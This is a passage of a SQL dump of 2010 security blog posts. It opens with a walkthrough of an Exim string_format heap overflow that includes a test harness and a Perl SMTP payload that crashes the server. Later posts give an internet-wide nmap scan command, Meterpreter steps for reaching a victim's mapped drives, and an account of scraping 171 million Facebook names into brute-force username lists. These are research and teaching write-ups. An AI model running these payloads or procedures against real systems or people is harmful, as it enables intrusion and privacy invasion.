string_format(uschar *buffer, int buflen, char *format, ...)\nBased on the patch and the nature of the function, it was obviously the %s format specifier that was being changed, and it seemed to have something to do with the bounds checking. Rather than reading/understanding all that complicated code, I decided to send stuff into that function and see if I could get it to write off its own buffer. Simple, eh?\nSo here\'s the first test I wrote (I took the lazy approach and replaced the real main() function in exim.c with this) (I swear this is the first thing I tried.. I must be lucky or something!):\nint main(int argc, char *argv[])\r\n{   \r\n    char buffer[16];\r\n    int i, j;\r\n\r\n    for(i = 1; i < 8; i++)\r\n    {   \r\n        memset(buffer, 0, 16);\r\n        string_format(buffer, i, \"TEST%s\", \r\n            \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");\r\n        for(j = 0; j < 16; j++)\r\n            printf(\"%02x \", buffer[j]);\r\n        printf(\"\\n\");\r\n    }\r\n    return 0;\r\n}\nSimple enough! We start by setting the buffer length to 1, which should produce an empty string (since the string is terminated with a NULL byte \'\\x00\'). Then we should see \'T\', then \'TE\', \'TES\', etc. Here\'s what the result is:\n$ make\r\n[...]\r\n$ build-Linux-x86_64/exim\r\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \r\n54 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \r\n54 45 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \r\n54 45 53 00 00 00 00 00 00 00 00 00 00 00 00 00 \r\n54 45 53 54 41 41 41 41 41 41 41 41 41 41 41 41 \r\n54 45 53 54 00 00 00 00 00 00 00 00 00 00 00 00 \r\n54 45 53 54 41 00 00 00 00 00 00 00 00 00 00 00\r\nSegmentation fault\r\n\nWoah, what have we here? When the max length is set to 5, all hell breaks loose! It even manages to segfault my test program (thanks, obviously, to a stack overflow). A quick check shows us that the \'%s\' is exactly 5 characters into the string, which just happens to be \'buflen\'. Testing with other strings will prove that if \'%s\' is at the index of \'buflen\', \'buflen\' is ignored and the string will be written right off the end of the buffer into whatever happens to be next. \nNow, that leads to the obvious question: where can we find a case where we can control \'buflen\' to ensure that \'%s\' ends up in exactly the right place? That\'s a rare condition indeed! And this is where I got a little stuck. To help track it down, I added some output to string_vformat() that displays the format string, buflen, and the output every time it runs. Then I did some normal transactions and looked at the output. Here\'s how (remove the newlines to test this yourself.. I only have so much horizontal room to work with):\necho -ne \'EHLO domain\\r\\nMAIL FROM: test@test.com\\r\\n\r\n    RCPT TO: test@localhost\\r\\nDATA\\r\\n\r\n    This is some data!\\r\\n.\\r\\n\' | sudo ./exim -bs\nThis builds an SMTP request with echo and sends it to the exim binary. \'exim -bs\' is how exim is run when it\'s used as inetd, which means it\'s expecting network traffic to come in stdin. Here are the strings that came into string_vformat():\nstring_vformat: [250] \'initializing\' => initializing\r\nstring_vformat: [48] \'%s\' => root\r\nstring_vformat: [128] \'%s\' => /root\r\nstring_vformat: [128] \'%s\' =>\r\nstring_vformat: [128] \'%s\' => /bin/bash\r\nstring_vformat: [250] \'accepting a local %sSMTP message from \' => \r\naccepting a local SMTP message from \r\nstring_vformat: [32768] \'SMTP connection from %s\' => SMTP connection from root\r\nstring_vformat: [32768] \'%s/log/%%slog\' => /var/spool/exim/log/%slog\r\nstring_vformat: [8171] \'%s\' => SMTP connection from root\r\nstring_vformat: [16384] \'%s\' => 220 ankh ESMTP Exim 4.69 \r\nTue, 14 Dec 2010 20:01:28 -0600\r\n\r\nstring_vformat: [32768] \'%.3s %s Hello %s%s%s\' => 250 ankh Hello root at domain\r\nstring_vformat: [16384] \'250 OK\r\n\' => 250 OK\r\n\r\nstring_vformat: [32768] \'ACL \"%s\"\' => ACL \"acl_check_rcpt\"\r\nstring_vformat: [16384] \'250 Accepted\r\n\' => 250 Accepted\r\n\r\nstring_vformat: [16384] \'354 Enter message, ending with \".\" on a line by itself\r\n\' => 354 Enter message, ending with \".\" on a line by itself\r\n\r\nstring_vformat: [208] \' id=%s\' =>  id=1PSggK-0002bd-0P\r\nstring_vformat: [32768] \'%sMessage-Id: \r\n\' => Message-Id: \r\n\r\nstring_vformat: [32768] \'%sFrom: %s%s%s%s\r\n\' => From: test@test.com\r\n\r\nstring_vformat: [32768] \'%sDate: %s\r\n\' => Date: Tue, 14 Dec 2010 20:01:28 -0600\r\n\r\nstring_vformat: [32768] \'%s; %s\r\n\' => Received: from root (helo=domain)\r\n        by ankh with local-esmtp (Exim 4.69)\r\n        (envelope-from )\r\n        id 1PSggK-0002bd-0P\r\n        for test@localhost; Tue, 14 Dec 2010 20:01:28 -0600\r\n\r\nstring_vformat: [32768] \'ACL \"%s\"\' => ACL \"acl_check_data\"\r\nstring_vformat: [8154] \'%s\' => <= test@test.com U=root P=local-esmtp S=294\r\nstring_vformat: [256] \'/var/spool/exim/log/%slog\' => /var/spool/exim/log/mainlog\r\nstring_vformat: [16384] \'250 OK id=%s\r\n\' => 250 OK id=1PSggK-0002bd-0P\r\n\r\nstring_vformat: [128] \'%s lost input connection\' => ankh lost input connection\r\nstring_vformat: [16384] \'%s %s\r\n\' => 421 ankh lost input connection\r\n\r\nstring_vformat: [32768] \'SMTP connection from %s\' => SMTP connection from root\r\nstring_vformat: [8171] \'%s lost%s\' => SMTP connection from root lost\r\n\nLooking down that list, none of those are obvious places where we can control the length of the format string. Damn! I tried a bunch of other variations without any luck. Things weren\'t looking good.. I was stuck! \nFortunately, the original post had a mostly complete packet dump. After playing for awhile, I finally figured out that sending a bunch of DATA headers, plus the 50mb of garbage, did something interesting! Here\'s the command I used (again, remove the linebreaks to try this):\n$ perl -e \'print \"EHLO domain\\r\\nMAIL FROM: test@test.com\\r\\n\r\n    RCPT TO: test@localhost\\r\\nDATA\\r\\n\" . \"This: is some data\\r\\n\"x100 . \r\n    \"This is more data!\\r\\n\"x5000000 . \"\\r\\n.\\r\\n\"\' | ./exim -bs\nAnd here\'s how the log looked:\nstring_vformat: [8018] \'%c %s\' =>   This: is some data\r\nstring_vformat: [7997] \'%c %s\' =>   This: is some data\r\nstring_vformat: [7976] \'%c %s\' =>   This: is some data\r\nstring_vformat: [7955] \'%c %s\' =>   This: is some data\r\nstring_vformat: [7934] \'%c %s\' =>   This: is some data\r\nstring_vformat: [7913] \'%c %s\' =>   This: is some data\r\nstring_vformat: [7892] \'%c %s\' =>   This: is some data\r\n.....down to 0\nGreat, this looks good! ... but why does it work?\nWell, it turns out that if a message is rejected (because, for example, it\'s too large), the headers for the message are logged in a buffer, one at a time. When each one is logged, the buffer is shortened, which means by tweaking the length of the headers we can control the \'buflen\' field. Since the format specifier \'%s\' is at the third character in the string, we want to end up with three bytes left then add a huge string to the buffer that overwrites the heap. \nSo now, we do a whole lot of complicated math and a ton of patience, we whittle the buffer to three bytes, then overflow the crap out of it:\n$ perl -e \'print \"EHLO domain\\r\\nMAIL FROM: test@test.com\\r\\n\r\n    RCPT TO: test@localhost\\r\\nDATA\\r\\n\" . \"This: is some data\\r\\n\"x381 . \r\n    \"Final: AAAA\\r\\nBoom: \" . \"A\"x50000 . \"This is more data!\\r\\n\"x5000000 . \r\n    \"\\r\\n.\\r\\n\"\' | ./exim -bs\r\n220 ankh ESMTP Exim 4.69 Tue, 14 Dec 2010 20:19:10 -0600\r\n250-ankh Hello ron at domain\r\n250-SIZE 52428800\r\n250-PIPELINING\r\n250 HELP\r\n250 OK\r\n250 Accepted\r\n354 Enter message, ending with \".\" on a line by itself\r\nSegmentation fault\r\n\nBodabing! Overflow successful. \nThe hard part is getting all the sizes, headers, etc just right. The easy part is turning this into code execution -- take a look at Metasploit to find out that part. \nWho\'s vulnerable?\nAny 4.6x version of Exim is potentially vulnerable, and possibly earlier versions too. The problem is, different versions may have different logging formats, which means the carefully selected count we did to overflow the buffer isn\'t going to cut it. So in reality, 4.69-debian is highly vulnerable, because that\'s what Metasploit and Nessus target; other versions may be as well. \nSo that naturally leads to the question - how many people are running Exim 4.69? Well, my friend bob, always the troublemaker, decided to scan 600,000 hosts on port 25 to see what\'s running. I don\'t recommend following in his footsteps, but this is the command he used:\n$ sudo ./nmap -n -d --log-errors -PS25 -p25 --open -sV -T5 -iR 600000 \r\n    -oA output/smtp-versions\nHere are the top 10 versions returned (I removed the versions that Nmap didn\'t recognize), along with their associated counts:\n    240 25/tcp open  smtp    syn-ack Postfix smtpd\r\n    206 25/tcp open  smtp    syn-ack Exim smtpd 4.69\r\n     96 25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.4675\r\n     78 25/tcp open  smtp    syn-ack qmail smtpd\r\n     77 25/tcp open  smtp    syn-ack netqmail smtpd 1.04\r\n     40 25/tcp open  smtp    syn-ack BorderWare firewall smtpd\r\n     22 25/tcp open  smtp    syn-ack Microsoft ESMTP\r\n     21 25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959\r\n     19 25/tcp open  smtp    syn-ack Cisco PIX sanitized smtpd\r\n     18 25/tcp open  smtp    syn-ack Sendmail 8.13.8/8.13.8\r\n\nBased on those numbers, I think it\'s safe to say that Exim smtpd 4.69 is the second most popular SMTP server in the universe. Here\'s a complete listing. I considered posting the full Nmap log, but I was worried that one of the servers\' owners might notice and be upset at Bob. And I don\'t want to make any extra trouble for him! \nConclusion\nThe conclusion to this is simple: To all those people running vulnerable (or potentially vulnerable) versions of exim: patch! Patch now! This is an incredibly easy exploit to pull off, and there are public versions everywhere. Protect yourself! \nAnd if you don\'t have a Nessus ProfessionalFeed, get one and you can test your network right now!', '\'Hacking\', \'Reverse Engineering\', \'Tools\'', 'https://blog.skullsecurity.org/2010/watch-out-for-exim');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (50, 'Faking demos for fun and profit', 'Ron Bowes', '2010-11-27', 'This week Last week Earlier this month Last month Last year (if this intro doesn\'t work, I give up trying to post this :) ), I presented at B-Sides Ottawa, which was put on by Andrew Hay and others (and sorry I waited so long before posting this... I kept revising it and not publishing). I got to give a well received talk, meet a lot of great folks, see Ottawa for the first time, and learn that I am a good solid Security D-lister. w00t! \nBefore I talk about the fun part, where I completely faked out my demo, if you want the slides you can grab them here:\nhttp://svn.skullsecurity.org:81/ron/security/2010-11-bsides-ottawa/. You can find more info about the conference and people\'s slides at the official site. And finally, here\'s a picture of me trying to look casual. \nB-sides conferences, for those of you who don\'t know, are awesome little conferences that often (but not always) piggyback on other conferences. They are free (or cheap), run by volunteers, and have raw and technical talks. B-sides Ottawa was no exception, and I\'m thrilled I had the chance to not only see it, but take part in it. I really hope to run our own B-sides Winnipeg next year!\n\nAnyway, my talk was on the Nmap Scripting Engine. I wrote a talk and a couple demoes, both of which are available at the above link. My plan was to do two live demoes, coded on stage, with no safety net. Pre-recording demoes is cheating! The demoes were the following:\n\nPerform a DNS lookup and scan a host\'s mailservers\nLook up the router\'s MAC address in a geolocation service and show the google map\n\nI practiced them over and over, and they were looking great, so I showed up at B-sides ready to go! \nThen I found out I had no Internet connection. \nCrap! \nSo, that night I had a lot of work to do, re-writing my entire talk to work with no Internet connection. As a natural procrastinator, I ended up hanging out with people until the middle of the night, so when I finally made it back to the hotel I couldn\'t do anything. So, four hours later, first thing in the morning, I got to work. \nProblem 1: DNS\nSo the first problem was that I had to perform DNS queries, both for MX and A records. I briefly considered using a shellscript and netcat to do this, but I\'m not *that* crazy. Instead, I made some minor changes to dnsxss to return a few fake mailservers for MX queries. \nThe default behaviour of dnsxss returns 127.0.0.1 for all A queries, and that\'s exactly what I wanted. \nFinally, I set the DNS server of my laptop to 127.0.0.1. Now, no matter what I requested, the right results came back. Problem solved! \nProblem 2: No mail servers!\nThe next problem I ran into is that I wanted to scan a mailserver. That was a simple matter of installing a SMTP server and making sure it ran on startup. Another option would have been faking it with netcat and a static response. \nWith those two problems solved, I had a workable first demo! On to the second...\nProblem 3: No MAC address\nMy second script was supposed to look up a MAC address\'s geolocation information, but what can I do without a MAC address? The easy way would have been to hardcode a MAC into the script, but that\'s cheating. Nmap doesn\'t return the MAC address for the loopback address, so I had to find a better way to cheat than simply redirecting DNS. \nThere\'s probably a far better way to do this, but I decided to simply set one of my VMWare instances to auto-start on boot. I could then scan it as if I was scanning my router with no one the wiser. Of course, its MAC address isn\'t going to be in the geolocation database, but that\'s okay because....\nProblem 4: Geolocation\nTo use Google\'s geolocation service, you obviously need to connect to Google (specifically, www.google.com/loc/json). Requests to www.google.com were already heading to localhost, thanks to my fake DNS server, so this was pretty easy. I created a valid JSON request that appeared to go to Google, and that appeared to have the proper MAC address embedded in it. Of course, it wasn\'t really going to Google, and it wasn\'t really the wireless MAC address. But because my Web server running on localhost always returned the proper coordinates, that didn\'t matter very much. \nAs a bonus, if I fudged up the MAC address encoding in any way, it wouldn\'t matter because it was returning a static page. \nProblem 5: Google maps\nThe grand finale was going to be when I copied/pasted the latitude and longitude into Google Maps and our current location popped up. Obviously, that couldn\'t happen. But, my fake DNS server, along with a screenshot of Google Maps, looked surprisingly realistic. \nOne little point - because I wanted the URL http://maps.google.ca/maps?q=... to work, I had to add a content-type override to a .htaccess file. Not very exciting, but eh?\nDone!\nThe week following B-sides Ottawa, I had the privilege to speak at DeepSec in Vienna, Austria (I spoke on password breaches, in case you\'re curious). Later that week, I was asked to do a short talk for Metalab, an Austrian hackerspace. I pulled out this talk again, without my cobbled together infrastructure, and wrote the scripts on stage. This time I had an Internet connection and guess what? They worked the first time! Sven Guckes also posted pictures of me getting ready and speaking. \nAnd there! I *finally* posted this! See you all at Shmoocon later this week!', '\'Conferences\', \'DNS\', \'Hacking\', \'Nmap\', \'Tools\'', 'https://blog.skullsecurity.org/2010/faking-demos-for-fun-and-profit');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (51, 'A call to arms! Web app fingerprints needed!', 'Ron Bowes', '2010-11-3', 'Hey all,\nThis is partly an overview of a new Nmap feature that I\'m excited about, but is mostly a call to arms. I don\'t have access to enterprise apps anymore, and I\'m hoping you can all help me out by submitting fingerprints! Read on for more.\n\nhttp-enum.nse\nI couldn\'t resist throwing in the full history of http-enum.nse, because I\'m chatty like that. If you want to get to the good stuff, go ahead and skip to the next section. \nLike most of my projects, I was inspired to work on this after I went to a conference and got some cool ideas. This one happened to be Defcon 17, and the catalyst was Kevin Johnson\'s talk on Yokoso. Basically, it had a list of known files, whether images or css files or anything else, and it would check if they exist in a browser\'s history to see if the person had been there. This was a great starting point for http-enum, so after getting Kevin\'s permission to use the Yokoso database, we intetegrated it and vastly improved http-enum.nse. \nThat was over a year ago, and just wasn\'t as powerful as it could be. So, finally, I decide a re-write was in order. \nThe logical choice for the file format seemed to be what Nikto uses. After all, we\'re basically implementing Nikto as an Nmap script, so why not make things inter-operable? I wrote the code, and it worked great, but I discussed the concept with Patrik from cqure.net and we quickly decided that even the Nikto format lacked the power we really wanted. \nMy final attempt, which I just committed to Nmap\'s subversion repository this week, was inspired by my success using a .lua file for my psexec configuration file. Instead of some random file format I invented, it uses a .lua file to build a table of fingerprints. You can take a look at the current version of the fingerprint file in Nmap\'s Web SVN. You\'ll see that it basically builds a table of fingerprints, each of which is in a well defined format. \nRunning http-enum.nse\nRunning http-enum.nse is pretty straight forward, since it\'s no different from any other script, so go ahead and skip this section if it\'s old news. \nTo use http-enum.nse, simply install the latest version of Nmap from SVN and run it:\nsvn co --username=\'guest\' --password=\'\' svn://svn.insecure.org/nmap ./nmap-svn\r\ncd nmap-svn\r\n./configure && make && make install\r\nnmap --script=http-enum -p80 -d -n www.javaop.com\n(www.javaop.com is my site, and is designed to come back with interesting results, so you\'re welcome to scan it)\nhttp-fingerprints.lua\nEach fingerprint can have multiple probes, each containing a path and a method (GET/POST/etc). We may extend this in the future to include more options, like postdata, http headers, etc, if the need arises. The nice thing about Lua tables is that it\'s completely extensible. \nEvery fingerprint also contains a match list, which defines the output and, optionally, one or more strings to match. Like Nmap\'s version check, this can capture portions of the match by including it in parenthesis (\'()\') and output them using \"\\1\", \"\\2\", etc.\nThere are other options, too, and you can find them by reading the header document of the http-fingerprints.lua file. The file should have more than enough information and examples to start building your own probes right now. \nAnd, speaking of building your own probes...\nA call to arms!\nSo, this is a powerful format. But, the entire http-fingerprints.lua file, as it stands, was based on static probes, so there are very few cases where it gets really interesting data. I no longer work for a place with a large network, so the best thing I can do my friend Bob can do is scan the Internet at random looking for interesting stuff. And while that\'s fun, it takes a long time and can upset certain organizations. \nI\'m hoping the community will help Nmap grow its fingerprint database. You can do this in many ways! \n\nGo to your major/interesting Web applications at work. Find the main page, or any unauthenticated page. Save the .html and send it, along with the path(s) where it\'s typically found, to me.\nGo to those applications, and write your own fingerprints. If possible, extract a version number. Send it to me.\nGo through the fingerprints I already have and see if you can improve the match. The current set of fingerprints were written before it was possible to extract versions, match text, etc.\nGo through the long list of \"Potentially interesting directory\" fingerprints at the end of http-fingerprints.lua and nominate ones that should be deleted or promoted to their own fingerprint.\n\nMy email is ron-at-skullsecurity.net. Or you can post it as a comment here, tweet me, etc. All my contact info is at the top right. \nAs you can see, there is a lot that needs to be done, but if we can make this a community effort, and everybody who reads this picks one enterprise application they use and submit a fingerprint for it, we can do some awesome stuff! \nMy fingerprint database is just over 1000 now.. let\'s see if we can double that!', '\'Hacking\', \'Nmap\', \'Tools\'', 'https://blog.skullsecurity.org/2010/a-call-to-arms-web-app-fingerprints-needed');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (52, 'Update on my life, conferences, career, etc', 'Ron Bowes', '2010-10-29', 'Hey all! \nIt\'s been awhile since I\'ve written on my blog, and I apologize. I\'m at a job now where I actually spend my day working instead of pondering, so it\'s hard to find time! :)\nSo, what\'s new with me?\nI\'m working on some cool new Nmap stuff right now, so I\'m hoping to write about that in the next couple months. Web application fingerprinting isn\'t something I\'ve seen done much, but I\'m hoping Nmap can make some good progress on it with the help of Yokoso, Nikto, and some other resources.\n\nAbout a month ago, I started working for Tenable Network Security. My job is primarily research and reverse engineering, so I\'ve been posting little tidbits to my Twitter account. My official title is \"vulnerability research engineer\", which is really cool, and they\'re paying me to speak at a couple conferences, which is exciting. I used to have to take vacation to go to conferences! \nI\'ve also worked on a number of cool plugins at Tenable, including remote checks for ms10-070 and ms10-075. I may start writing more about my Tenable experiences here! \nB-sides Ottawa\nI\'m going to be speaking at B-sides Ottawa on November 13. If any of you are in the area, please come by! I\'ll be discussing the Nmap Scripting Engine, and showing everybody how easy it is to write their own scripts. This will be my first time to Ottawa, and I have 3-4 days after the conference to hang out, so I\'d love to get a tour of the city from somebody local! \nDeepsec (Vienna)\nTwo weeks later, I\'m heading to Vienna, Austria, to speak at Deepsec! The talk is on November 26 and will be about password breaches/attacks, and it will be my first time in Europe. I can\'t wait! \nBesides security, I just moved back home after 9 weeks of staying with a friend. My place was being repaired, and the repairs took significantly longer than planned, so I got screwed on the deal. But, I have a new floor, carpet, baseboards, and it didn\'t cost me anything! It looks great, and I\'m excited to finish the move.', '\'Conferences\'', 'https://blog.skullsecurity.org/2010/update-on-my-life-conferences-career-etc');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (53, 'Finding Mapped Drives with Meterpreter', 'Matt Gardenghi', '2010-9-1', 'This post written by Matt Gardenghi\n---------\nThis is going to be a series of short \"how to\" articles so that I have a resource when I forget how I did something. Your benefit from this post is incidental to my desire to have a resource I can reach when I\'ve had a brain cloud.\nWhen cracking into a computer via Metasploit, I often (OK, usually) install meterpreter.  It just makes life simpler.  Well, the other day, I was chatting with @jcran about my inability to get access to network drives on a Novell network.  The problem is that Novell maps drives in a sorta funny method compared to Active Directory. At least that was my thought.  The problem generally is that Novell handles things extremely differently then AD, that I assumed that things would be different.  #facepalm\n\nAnyhow, @jcran pointed out the following things to me:\n1) If you are SYSTEM, you won\'t have the credentials of the logged in user.\n2) The drives are mapped to the user and SYSTEM isn\'t a user with mapped drives.\n3) The process is the same for finding mapped drives in both Novell and AD.\nThe procedure for accessing the user\'s drives goes like this for the SYSTEM user at the Meterpreter prompt:\n1) run migrate explorer.exe (this migrates you to the explorer process and gives you the logged in user\'s privileges.)\n2) getuid (verify that you are now the user)\n3) run get_env (this dumps the environmental variables including the mapped drives)\n4) cd <drive letter> (browse the drives at your leisure)\nSimple enough.  Now if only I\'d thought it out first....', '\'Hacking\'', 'https://blog.skullsecurity.org/2010/finding-mapped-drives-with-meterpreter');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (54, 'Followup to my Facebook research', 'Ron Bowes', '2010-8-12', 'Hey all,\nSome of you may have heard what I did this month. It turns out, depending on who you listen to, that I\'m either an evil \"Facebook hacker\" or just some mischievous individual doing \"unsettling\" research. But, one way or the other, a huge number of people have read or heard this story, and that\'s pretty cool. \nAlthough it\'s awesome (and humbling) that so much attention was paid (at least for a couple days) to some fairly straight forward work I did, I want to talk about this from my perspective, including why I did it and what I think this means to the community. Then, for fun, I\'ll end by talking about other places this research can go and open up the floor for some discussion.\n\nWhy I did it\nThe biggest question I get is: why? -- and it\'s a valid question. Why would I \"expose\" public data to the public? And, do I get this excited every year when I get the new phonebook?\nWell, let\'s talk about it! \nFirst off, as many of you know, I\'m a developer for the Nmap security scanner. Among many, many other things, I\'ve written several of the bruteforce (aka, \'auth\') scripts, which are designed to test password strength on a system. The Ncrack tool, a recent addition to the Nmap suite written by Ithilgore, is primarily designed to test password strength by guessing username/password combinations, much like Hydra and Medusa.\nWhen I joined the Nmap project, it came with a set of 8 or so common usernames and a couple hundred common passwords. The original password list, put together by Kris Katterjohn, was entirely based on some exposed MySpace passwords. Those passwords were sub-optimal because they were phished, not leaked/breached, which means passwords with messages to the phishers, like \"fuckyou\", are artificially common (not to mention \"suck my dick\" and \"piss off cracker head\" -- I highly suggest searching the list for swear words and body parts, it\'s actually really amusing). \nFortunately for us, as password researchers, there were several more password breaches around that same time. One of the most interesting from a research perspective, due to it being the biggest breach at the time (with 188,000 records), was Phpbb. The Phpbb passwords hashed with md5 so converting them into a useful password list was a long process (that, I\'m happy to report, is over 98% done -- not by me). \nNot too long after the Phpbb breach, RockYou came along. I\'m not going to link to my RockYou list directly, because of the size, but it consists of 32 million plaintext passwords and you can find it on my passwords page. From a password research perspective, we couldn\'t have asked for better data. \nAnyway, with all these breaches, keeping track of the lists became a hassle. So, like anybody who doesn\'t want to do the work himself, I set up a wiki page to keep track of my lists. Since I created it, I\'ve had exceptionally good feedback about from researchers around the world. As far as I know, it\'s the best collection of breached passwords anywhere. Nmap\'s current password list is based on extensive research performed by Nmap developers based on our many lists. \nNow, back to the Facebook names. There are actually two sides to the situation. The first, and most obvious, occurs when Nmap (or the other tools I mentioned) are performing a password-guessing audit against a host. Before it can guess a password, the program requires a high-quality list of usernames. Those names could be harvested from the site (such as an email directory), they could be created using default usernames lists (such as \'administrator\', \'web\', \'user\', \'guest\', etc), or they could be chosen using lists of actual names (such as \'jsmith\' or \'rbowes\'). That\'s where this list comes in -- having a list of 10, 100, or 1000 names wouldn\'t help us much, because there are billions of people in the world, but having a sample of 170 million names is a great cross-section that gives us great insight into the most common names and, therefore, the most common usernames (who would have thought that \'jsmith\' would be the most common?)\nThe second reason, however, is more interesting to me because it continues my research into how people choose passwords. It\'s a well known fact to anybody in the security field that people choose poor passwords. By studying the most common trends in password choices, we help teach people how to choose better passwords (and hopefully, someday, we\'ll find a way to eliminate passwords altogether). I hope to put together some numbers showing how many people use passwords based on names. Although I don\'t have results that I\'m comfortable with releasing yet, I hope to put together some statistics in the future. Stay tuned for that!\nGetting out of control\nI hope now you have some insight into my motives. It was some simple research, how did it become so popular?\nWell, the first reason is because when I wrote the the original blog I posted on the subject, I was somewhat careless with my language. As a result, people got the wrong impression and thought I had a lot more data than I actually did. As you can see in the original story posted by the BBC, the whole situation sounded a lot more exciting, and controversial, than it actually was. \nNow, at the time that these stories were running, I wasn\'t at home. In fact, I on that particular day, I was at the Grand Canyon. Now, why would I post some interesting research the day before I was going to the Grand Canyon? Well, all I can say is that planning ahead is overrated. :)\nAnyway, because I was out of town, and Canadian telcos charge ludicrous roaming fees, I wasn\'t in a hurry to answer phonecalls or spend time on the phone doing an interview. Therefore, despite making attempts to contact me, the reporter from the BBC, Daniel Emery, ended up posting the story as he understood it at the time. \nFortunately, that night, me and Daniel had a great email conversation about the work I did. The result was an updated story that very clearly spells out my motivations and, in my opinion, is one of the best stories on the topic. \nBy then, though, the damage was done. Hundreds of articles were published. All for something that really wasn\'t a big deal. \nI\'m thankful, though, that Facebook\'s response aligned with mine, and that they didn\'t make any kind of an attempt to pursue legal action or request that I remove the information or anything else. That\'s a far better response than I\'d expected, to be honest, and I have to thank Facebook for that (even if they didn\'t invite me to their Defcon party ;) ). \nWhat\'s this data mean?\nSo, as I said, I collected exactly two pieces of data:\n\nThe names of 170 million users\nThe URL of those users\n\nI did NOT collect email addresses, friends, private data, public data, or anything else. And the URL might lead to nothing but a name and whatever picture the user chose -- that\'s what Facebook shares at a minimum. Downloading the actual profile pages of all the users, based on some quick calculations I made, would be about 3tb big. Of course, I don\'t doubt that somebody is trying. :)\nSo now, I want to open up the discussion a little. I\'ve been telling reporters (and everybody else) since it started that this data doesn\'t mean anything, and is only interesting as a research project into common names. My challenge to you, the readers, is: what more can be done with this data?\nI\'ve had several email (and real-world) discussions with various people, all of whom will remain unnamed. Some were from businesses, some academia, and some media. Here are some thoughts people have run by me (if you see something that you don\'t want publicized, please let me know and I\'ll remove it from this page; I tried to keep these vague enough not to upset anybody, though):\n\nA business person suggested that companies who publish names for a living (eg, common baby names) might be interested in this data\nOther social network sites might want to check overlaps and/or build links between profiles on their site and Facebook\nIn a blog comment, somebody suggested, and is working on, downloading profile pictures for facial recognition\nOn IRC, we discussed the possibility of analyzing the user IDs, included in the URLs, to see if it\'s possible to enumerate non-searchable accounts\nA researcher suggested using this data to study the name letter effect, though I haven\'t collected enough information for that to be useful\nSimilarly, names themselves can be indicative of race/culture -- could this be used for targeted advertising?\n\nSo, those are some ideas to expand this research, some of which are actually being worked on right now. And don\'t get me wrong, those are good ideas, but I\'d really like to get some more. Why should we, whether we\'re security researchers, media, academics, etc, care about having a list of 170,000,000 names and URLs? What can we get from aggregating this data that we didn\'t have before? What can a good person do with it? What about an evil person?\nI\'d love to hear most opinions!', '\'Passwords\'', 'https://blog.skullsecurity.org/2010/followup-to-my-facebook-research');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (55, 'Return of the Facebook Snatchers', 'Ron Bowes', '2010-7-26', 'First and foremost: if you want to cut to the chase, just download the torrent. If you want the full story, please read on....\nBackground\nWay back when I worked at Symantec, my friend Nick wrote a blog that caused a little bit of trouble for us: Attack of the Facebook Snatchers. I was blog editor at the time, and I went through the usual sign off process and, eventually, published it. Facebook was none too happy, but we fought for it and, in the end, we got to leave the blog up in its original form.\nWhy do I bring this up? Well last week @FSLabsAdvisor wrote an interesting Tweet: it turns out, by heading to https://www.facebook.com/directory, you can get a list of every searchable user on all of Facebook! \nMy first idea was simple: spider the lists, generate first-initial-last-name (and similar) lists, then hand them over to @Ithilgore to use in Nmap\'s awesome new bruteforce tool he\'s working on, Ncrack.\n\nBut as I thought more about it, and talked to other people, I realized that this is a scary privacy issue. I can find the name of pretty much every person on Facebook. Facebook helpfully informs you that \"[a]nyone can opt out of appearing here by changing their Search privacy settings\" -- but that doesn\'t help much anymore considering I already have them all (and you will too, when you download the torrent). Suckers!\nOnce I have the name and URL of a user, I can view, by default, their picture, friends, information about them, and some other details. If the user has set their privacy higher, at the very least I can view their name and picture. So, if any searchable user has friends that are non-searchable, those friends just opted into being searched, like it or not! Oops :) \nThe lists\nWhich brings me to the next topic: the list! I wrote a quick Ruby script (which has since become a more involved Nmap Script that I haven\'t used for harvesting yet) that I used to download the full directory. I should warn you that it isn\'t exactly the most user friendly interface -- I wrote it for myself, primarily, I\'m only linking to it for reference. I don\'t really suggest you try to recreate my spidering. It\'s a waste of several hundred gigs of bandwidth. \nThe results were spectacular. 171 million names (100 million unique). My original plan was to use this list to generate a list of the top usernames (based on first initial last name):\n 129369 jsmith\r\n  79365 ssmith\r\n  77713 skhan\r\n  75561 msmith\r\n  74575 skumar\r\n  72467 csmith\r\n  71791 asmith\r\n  67786 jjohnson\r\n  66693 dsmith\r\n  66431 akhan\r\n\nOr first name last initial:\n 100225 johns\r\n  97676 johnm\r\n  97310 michaelm\r\n  93386 michaels\r\n  88978 davids\r\n  85481 michaelb\r\n  84824 davidm\r\n  82677 davidb\r\n  81500 johnb\r\n  77800 michaelc\r\n\nOr even the top usernames based on first name dot last name (sorry, I can\'t link this one due to bandwidth concerns; but it\'s included in the torrent):\n  17204 john.smith\r\n   7440 david.smith\r\n   7200 michael.smith\r\n   6784 chris.smith\r\n   6371 mike.smith\r\n   6149 arun.kumar\r\n   5980 james.smith\r\n   5939 amit.kumar\r\n   5926 imran.khan\r\n   5861 jason.smith\r\n\nOr even the most common first or last names:\n\r\n 977014 michael\r\n 963693 john\r\n 924816 david\r\n 819879 chris\r\n 640957 mike\r\n 602088 james\r\n 584438 mark\r\n 515686 jason\r\n 503658 robert\r\n 484403 jessica\r\n\r\n 913465 smith\r\n 571819 johnson\r\n 512312 jones\r\n 503266 williams\r\n 471390 brown\r\n 386764 lee\r\n 360010 khan\r\n 355639 singh\r\n 343220 kumar\r\n 324972 miller\r\n\nSo, those are the top 10 lists. But I\'ll bet you want everything!\nThe Torrent\nBut it occurred to me that this is public information that Facebook puts out, I\'m assuming for search engines or whatever, and that it wouldn\'t be right for me to keep it private. Why waste Facebook\'s bandwidth and make everybody scrape it, right? \nSo, I present you with: a torrent! If you haven\'t download it, download it now! And seed it for as long as you can. \nThis torrent contains:\n\nThe URL of every searchable Facebook 